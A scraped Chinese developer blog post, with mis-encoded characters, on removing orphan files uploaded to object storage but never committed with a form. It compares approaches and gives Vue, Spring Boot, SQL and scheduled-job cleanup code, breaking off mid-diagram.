<p>æœ¬ç¯‡å°±åˆ°è¿™é‡Œï¼Œå¸Œæœ›å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å­¤å„¿èµ„æºæ²»ç†ï¼šå¦‚ä½•ä¼˜é›…å¤„ç†â€œä¸Šä¼ äº†ä½†æœªæäº¤â€çš„å†—ä½™æ–‡ä»¶ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592683699771113482</link>    <guid>https://juejin.cn/post/7592683699771113482</guid>    <pubDate>2026-01-08T03:45:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592683699771113482" data-draft-id="7592548677744558126" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å­¤å„¿èµ„æºæ²»ç†ï¼šå¦‚ä½•ä¼˜é›…å¤„ç†â€œä¸Šä¼ äº†ä½†æœªæäº¤â€çš„å†—ä½™æ–‡ä»¶ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯,Java,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-08T03:45:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ´›å°è±†"/> <meta itemprop="url" content="https://juejin.cn/user/2049145406229127"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å­¤å„¿èµ„æºæ²»ç†ï¼šå¦‚ä½•ä¼˜é›…å¤„ç†â€œä¸Šä¼ äº†ä½†æœªæäº¤â€çš„å†—ä½™æ–‡ä»¶ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2049145406229127/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ´›å°è±†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:45:53.000Z" title="Thu Jan 08 2026 03:45:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ€è¿‘åœ¨å¼€å‘åŠŸèƒ½çš„æ—¶å€™ï¼Œæ–°å¢äº†æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ã€‚ä½†æ˜¯å‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯OSSé‡Œå †ç§¯äº†å¤§é‡â€œæ— ä¸»â€çš„æ–‡ä»¶ï¼šç”¨æˆ·ä¸Šä¼ äº†å¤´åƒä½†æ²¡ä¿å­˜èµ„æ–™ã€ä¸Šä¼ äº†é™„ä»¶å´å…³é—­äº†é¡µé¢â€¦è¿™äº›â€œå­¤å„¿æ–‡ä»¶â€é™é™åœ°èººåœ¨å­˜å‚¨æ¡¶é‡Œï¼Œæ²¡äººå¼•ç”¨ï¼Œä¹Ÿæ²¡äººæ¸…ç†ã€‚</p>
</blockquote>
<h2 data-id="heading-0">1. èƒŒæ™¯ä¸ç—›ç‚¹</h2>
<p>åœ¨ Web ç³»ç»Ÿå¼€å‘ä¸­ï¼Œ<strong>â€œè¡¨å• + æ–‡ä»¶ä¸Šä¼ â€</strong> æ˜¯ä¸€ä¸ªæé«˜é¢‘çš„åœºæ™¯ã€‚</p>
<p>é€šå¸¸çš„å®ç°æµç¨‹æ˜¯ï¼š</p>
<ol>
<li>ç”¨æˆ·åœ¨è¡¨å•é¡µç‚¹å‡»ä¸Šä¼ ï¼Œå‰ç«¯è°ƒç”¨ä¸Šä¼ æ¥å£ã€‚</li>
<li>æœåŠ¡ç«¯æ¥æ”¶æ–‡ä»¶ï¼Œä¸Šä¼ è‡³ OSSï¼Œå¹¶è¿”å› URLã€‚</li>
<li>å‰ç«¯æ‹¿åˆ° URLï¼Œå¡«å…¥è¡¨å•çš„éšè—åŸŸã€‚</li>
<li>ç”¨æˆ·ç‚¹å‡»â€œæäº¤â€ï¼Œå°†è¡¨å•æ•°æ®ï¼ˆå« URLï¼‰å‘é€ç»™æœåŠ¡ç«¯ä¿å­˜ã€‚</li>
</ol>
<p><strong>æ ¸å¿ƒç—›ç‚¹ï¼š</strong>
å¦‚æœç”¨æˆ·åœ¨ç¬¬ 2 æ­¥ä¸Šä¼ æˆåŠŸåï¼Œå› ä¸ºç½‘ç»œä¸­æ–­ã€é¡µé¢å…³é—­æˆ–ä¸»è§‚æ”¾å¼ƒç­‰åŸå› ï¼Œ<strong>æ²¡æœ‰æ‰§è¡Œç¬¬ 4 æ­¥çš„æäº¤</strong>ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å°±å·²ç»å­˜åœ¨äº OSS ä¸­ï¼Œä½†æ²¡æœ‰ä»»ä½•ä¸šåŠ¡æ•°æ®å¼•ç”¨å®ƒã€‚</p>
<p>ä¹…è€Œä¹…ä¹‹ï¼Œè¿™äº›<code>å­¤å„¿æ–‡ä»¶ï¼ˆOrphan Filesï¼‰</code>ä¼šå ç”¨å¤§é‡å­˜å‚¨ç©ºé—´ï¼Œå¢åŠ æˆæœ¬ï¼Œç”šè‡³å¸¦æ¥åˆè§„é£é™©ã€‚</p>
<p>æœ¬æ–‡å°†æä¾›ä¸€å¥—ç”Ÿäº§çº§çš„è§£å†³æ–¹æ¡ˆï¼Œæ¶µç›–è½»é‡çº§åœºæ™¯ä¸é€šç”¨åœºæ™¯çš„æ²»ç†ç­–ç•¥ã€‚</p>
<h2 data-id="heading-1">2. æ–¹æ¡ˆå¯¹æ¯”ä¸é€‰å‹</h2>
<p>é’ˆå¯¹æ­¤é—®é¢˜ï¼Œä¸šç•Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§è§£æ³•ï¼Œéœ€æ ¹æ®ä¸šåŠ¡åœºæ™¯çµæ´»é€‰æ‹©ï¼š</p>








































<table><thead><tr><th align="left">æ–¹æ¡ˆ</th><th align="left">æ ¸å¿ƒé€»è¾‘</th><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left"><strong>æ–¹æ¡ˆ Aï¼šæ··åˆæäº¤ (FormData)</strong></td><td align="left"><strong>æ–‡ä»¶ä¸è¡¨å•åŒæ¥å£ä¸€æ¬¡æäº¤</strong></td><td align="left"><strong>åŸå­æ€§ï¼Œæ— å­¤å„¿æ–‡ä»¶</strong></td><td align="left">ä¸æ”¯æŒå¤§æ–‡ä»¶ï¼Œç”¨æˆ·ä½“éªŒå·®ï¼ˆéœ€ç­‰å¾…ä¸Šä¼ ï¼‰</td><td align="left"><strong>å°æ–‡ä»¶ã€å¤´åƒã€å‡­è¯</strong></td></tr><tr><td align="left"><strong>æ–¹æ¡ˆ Bï¼šä¸¤é˜¶æ®µæäº¤</strong></td><td align="left"><strong>ä¸Šä¼ å³ä¸´æ—¶ï¼Œä¸šåŠ¡æäº¤æ‰è½¬æ­£</strong></td><td align="left"><strong>é€»è¾‘ä¸¥å¯†ï¼Œå®Œå…¨å¯æ§ï¼Œä½“éªŒå¥½</strong></td><td align="left">å¼€å‘æˆæœ¬ç¨é«˜ï¼Œéœ€å¼•å…¥å®šæ—¶ä»»åŠ¡</td><td align="left"><strong>å¤§æ–‡ä»¶ã€é€šç”¨ä¸šåŠ¡</strong></td></tr><tr><td align="left"><strong>æ–¹æ¡ˆ Cï¼šå®šæœŸåæŸ¥</strong></td><td align="left">å®šæ—¶æ‰«ææ–‡ä»¶è¡¨ï¼ŒåæŸ¥ä¸šåŠ¡è¡¨</td><td align="left">é€»è¾‘ç›´è§‚</td><td align="left">è·¨è¡¨æŸ¥è¯¢æˆæœ¬é«˜ï¼Œæ‰©å±•æ€§å·®</td><td align="left">æ—§ç³»ç»Ÿæ”¹é€ </td></tr><tr><td align="left"><strong>æ–¹æ¡ˆ Dï¼šOSS ç”Ÿå‘½å‘¨æœŸ</strong></td><td align="left">åˆ©ç”¨ OSS è§„åˆ™è‡ªåŠ¨åˆ é™¤ <code>temp/</code></td><td align="left">é›¶ä»£ç </td><td align="left">æ— æ³•ç²¾ç¡®æ§åˆ¶ä¸šåŠ¡çŠ¶æ€</td><td align="left">å…œåº•è¾…åŠ©</td></tr></tbody></table>
<p><strong>é€‰å‹ç»“è®ºï¼š</strong></p>
<ul>
<li><strong>è½»é‡çº§åœºæ™¯</strong>ï¼ˆå¦‚å¤´åƒä¿®æ”¹ï¼‰ï¼šä¼˜å…ˆä½¿ç”¨ <strong>æ–¹æ¡ˆ Aï¼ˆæ··åˆæäº¤ï¼‰</strong>ï¼Œç®€å•ç²—æš´ã€‚</li>
<li><strong>é€šç”¨/å¤æ‚åœºæ™¯</strong>ï¼šæ¨èé‡‡ç”¨ <strong>æ–¹æ¡ˆ Bï¼ˆä¸¤é˜¶æ®µæäº¤ï¼‰</strong> ä½œä¸ºä¸»æ–¹æ¡ˆï¼Œé…åˆ <strong>æ–¹æ¡ˆ D</strong> ä½œä¸ºå…œåº•ã€‚</li>
</ul>
<h2 data-id="heading-2">3. è½»é‡çº§è§£æ³•ï¼šæ··åˆæäº¤ (FormData)</h2>
<p>å¯¹äºæ–‡ä»¶ä½“ç§¯å°ï¼ˆ&lt; 2MBï¼‰ã€æ•°é‡å°‘çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æ”¾å¼ƒå¼‚æ­¥ä¸Šä¼ ï¼Œç›´æ¥å°†æ–‡ä»¶æµä¸ JSON æ•°æ®æ‰“åŒ…åœ¨ä¸€èµ·æäº¤ã€‚</p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šåˆ©ç”¨ HTTP è¯·æ±‚çš„åŸå­æ€§ï¼Œè¦ä¹ˆå…¨æˆåŠŸï¼Œè¦ä¹ˆå…¨å¤±è´¥ï¼Œæ ¹æºä¸Šæ¶ˆç­å­¤å„¿æ–‡ä»¶ã€‚</p>
<p><strong>å‰ç«¯ä»£ç ç¤ºä¾‹ï¼ˆVue/Axiosï¼‰ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">data, imageFile</span>) {
  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>()
  
  <span class="hljs-comment">// 1. å°†å¤æ‚çš„ JSON æ•°æ®è½¬ä¸º Blob æ”¾å…¥ data å­—æ®µ</span>
  <span class="hljs-comment">// æ³¨æ„è®¾ç½® Content-Type ä¸º application/jsonï¼Œæ–¹ä¾¿åç«¯è§£æ</span>
  formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'data'</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)], { <span class="hljs-attr">type</span>: <span class="hljs-string">'application/json'</span> }))
  
  <span class="hljs-keyword">if</span> (imageFile) {
    <span class="hljs-comment">// 2. (å¯é€‰) å‰ç«¯å‹ç¼©å›¾ç‰‡</span>
    <span class="hljs-keyword">const</span> webpFile = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convertImageToWebp</span>(imageFile, <span class="hljs-number">0.8</span>)
    formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'imageFile'</span>, webpFile)
  }
  
  <span class="hljs-comment">// 3. ä¸€æ¬¡æ€§æäº¤</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'/reward'</span>, <span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>, <span class="hljs-attr">data</span>: formData })
}
</code></pre>
<p><strong>åç«¯å¤„ç†ï¼ˆSpring Boot ç¤ºä¾‹ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PostMapping(value = "/reward", consumes = MediaType.MULTIPART_FORM_DATA_VALUE)</span>
<span class="hljs-keyword">public</span> Result <span class="hljs-title function_">create</span><span class="hljs-params">(
    <span class="hljs-meta">@RequestPart("data")</span> RewardDTO rewardDTO, // è‡ªåŠ¨è§£æ JSON
    <span class="hljs-meta">@RequestPart(value = "imageFile", required = false)</span> MultipartFile imageFile
)</span> {
    <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘ä¸æ–‡ä»¶å¤„ç†åœ¨åŒä¸€çº¿ç¨‹/äº‹åŠ¡ä¸­</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> ossService.upload(imageFile);
    rewardService.save(rewardDTO, url);
    <span class="hljs-keyword">return</span> Result.ok();
}
</code></pre>
<h2 data-id="heading-3">4. é€šç”¨çº§è§£æ³•ï¼šä¸¤é˜¶æ®µæäº¤</h2>
<p>å¯¹äºå¤§æ–‡ä»¶æˆ–ä½“éªŒè¦æ±‚é«˜çš„åœºæ™¯ï¼Œå¿…é¡»ä½¿ç”¨å¼‚æ­¥ä¸Šä¼ ã€‚æ­¤æ—¶éœ€å¼•å…¥<strong>ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ã€‚</p>
<h3 data-id="heading-4">4.1 æ ¸å¿ƒæ€æƒ³</h3>
<p>å°†æ–‡ä»¶çš„ç”Ÿå‘½å‘¨æœŸåˆ’åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>ä¸´æ—¶æ€ (TEMP)</strong>ï¼šæ–‡ä»¶åˆšä¸Šä¼ ï¼Œåªæœ‰â€œä¸´æ—¶å±…ä½è¯â€ï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆå¦‚ 24hï¼‰ã€‚</li>
<li><strong>å·²ç”¨æ€ (USED)</strong>ï¼šä¸šåŠ¡è¡¨å•æäº¤æˆåŠŸåï¼Œç¡®è®¤ä¸ºâ€œæ°¸ä¹…å±…æ°‘â€ã€‚</li>
</ol>
<h3 data-id="heading-5">4.2 æ•°æ®åº“è®¾è®¡</h3>
<p>æˆ‘ä»¬éœ€è¦ä¸€å¼ ç»Ÿä¸€çš„æ–‡ä»¶è®°å½•è¡¨ <code>sys_file</code>ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `sys_file` (
  `id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  `url` <span class="hljs-type">varchar</span>(<span class="hljs-number">512</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'æ–‡ä»¶åœ°å€'</span>,
  `status` tinyint <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span> COMMENT <span class="hljs-string">'0:TEMP(ä¸´æ—¶), 1:USED(å·²ç”¨)'</span>,
  `expire_time` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'è¿‡æœŸæ—¶é—´'</span>,
  `create_time` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),
  KEY `idx_status_expire` (`status`, `expire_time`) <span class="hljs-comment">-- æ–¹ä¾¿å®šæ—¶ä»»åŠ¡æ‰«æ</span>
);
</code></pre>
<h3 data-id="heading-6">4.3 ä¸šåŠ¡æµç¨‹å®ç°</h3>
<h4 data-id="heading-7">Step 1: æ–‡ä»¶ä¸Šä¼ ï¼ˆé»˜è®¤ä¸ºä¸´æ—¶ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> FileVO <span class="hljs-title function_">upload</span><span class="hljs-params">(MultipartFile file)</span> {
    <span class="hljs-comment">// 1. ä¸Šä¼ è‡³ OSS</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> ossClient.putObject(file);
    
    <span class="hljs-comment">// 2. è®°å½•åˆ°æœ¬åœ°è¡¨ï¼ŒçŠ¶æ€ä¸º TEMP</span>
    <span class="hljs-type">SysFile</span> <span class="hljs-variable">sysFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SysFile</span>();
    sysFile.setUrl(url);
    sysFile.setStatus(Status.TEMP);
    <span class="hljs-comment">// 3. å…³é”®ï¼šè®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆä¾‹å¦‚ 24 å°æ—¶åï¼‰</span>
    sysFile.setExpireTime(LocalDateTime.now().plusHours(<span class="hljs-number">24</span>));
    
    sysFileMapper.insert(sysFile);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileVO</span>(sysFile.getId(), url);
}
</code></pre>
<h4 data-id="heading-8">Step 2: ä¸šåŠ¡æäº¤ï¼ˆç¡®è®¤è½¬æ­£ï¼‰</h4>
<p>è¿™æ˜¯ç¡®ä¿æ•°æ®ä¸€è‡´æ€§çš„å…³é”®æ­¥éª¤ï¼Œå¿…é¡»åœ¨<strong>äº‹åŠ¡</strong>ä¸­è¿›è¡Œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createProduct</span><span class="hljs-params">(ProductForm form)</span> {
    <span class="hljs-comment">// 1. ä¿å­˜ä¸šåŠ¡æ•°æ®</span>
    productMapper.insert(form);
    
    <span class="hljs-comment">// 2. å°†å…³è”çš„æ–‡ä»¶ ID æ ‡è®°ä¸º USED</span>
    <span class="hljs-comment">// åªæœ‰ä¸šåŠ¡ä¿å­˜æˆåŠŸï¼Œæ–‡ä»¶æ‰ä¼šè¢«æ ‡è®°ï¼Œé¿å…äº†â€œä¸šåŠ¡å¤±è´¥æ–‡ä»¶ç¡®ä¿ç•™â€çš„æƒ…å†µ</span>
    <span class="hljs-keyword">if</span> (CollectionUtils.isNotEmpty(form.getFileIds())) {
        sysFileMapper.updateStatusBatch(form.getFileIds(), Status.USED);
    }
}
</code></pre>
<h4 data-id="heading-9">Step 3: å®šæ—¶æ¸…ç†ï¼ˆåƒåœ¾å›æ”¶ï¼‰</h4>
<p>å¯åŠ¨ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼ˆå¦‚ XXL-JOBï¼‰ï¼Œæ¯å°æ—¶æ‰§è¡Œä¸€æ¬¡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@XxlJob("cleanTempFileJob")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanTempFileJob</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 1. æ‰«ææ‰€æœ‰çŠ¶æ€ä¸º TEMP ä¸”å·²è¿‡æœŸçš„æ–‡ä»¶</span>
    List&lt;SysFile&gt; expiredFiles = sysFileMapper.selectExpired(Status.TEMP, LocalDateTime.now());
    
    <span class="hljs-keyword">for</span> (SysFile file : expiredFiles) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 2. åˆ é™¤ OSS ä¸Šçš„ç‰©ç†æ–‡ä»¶</span>
            ossClient.deleteObject(file.getUrl());
            <span class="hljs-comment">// 3. åˆ é™¤ï¼ˆæˆ–å½’æ¡£ï¼‰æœ¬åœ°è®°å½•</span>
            sysFileMapper.deleteById(file.getId());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"æ–‡ä»¶æ¸…ç†å¤±è´¥: "</span> + file.getId(), e);
        }
    }
}
</code></pre>
<h3 data-id="heading-10">4.4 æ¶æ„äº¤äº’å›¾</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant User as ç”¨æˆ·
    participant App as åç«¯æœåŠ¡
    participant DB as æ•°æ®åº“
    participant OSS as å¯¹è±¡å­˜å‚¨
    participant Job as æ¸…ç†ä»»åŠ¡

    User-&gt;&gt;App: 1. ä¸Šä¼ æ–‡ä»¶
    App-&gt;&gt;OSS: ç‰©ç†å­˜å‚¨
    App-&gt;&gt;DB: è®°å½•æ–‡ä»¶ (Status=TEMP)
    App--&gt;&gt;User: è¿”å› fileId

    alt ç”¨æˆ·æäº¤è¡¨å•
        User-&gt;&gt;App: 2. æäº¤ä¸šåŠ¡æ•°æ®(å« fileId)
        App-&gt;&gt;DB: å¼€å¯äº‹åŠ¡
        App-&gt;&gt;DB: ä¿å­˜ä¸šåŠ¡æ•°æ®
        App-&gt;&gt;DB: æ›´æ–°æ–‡ä»¶ Status=USED
        App--&gt;&gt;User: æˆåŠŸ
    else ç”¨æˆ·æ”¾å¼ƒ
        Note right of User: æ— æ“ä½œ
    end

    loop å®šæ—¶æ¸…ç†
        Job-&gt;&gt;DB: æŸ¥è¯¢ (Status=TEMP &amp; Time &lt; Now)
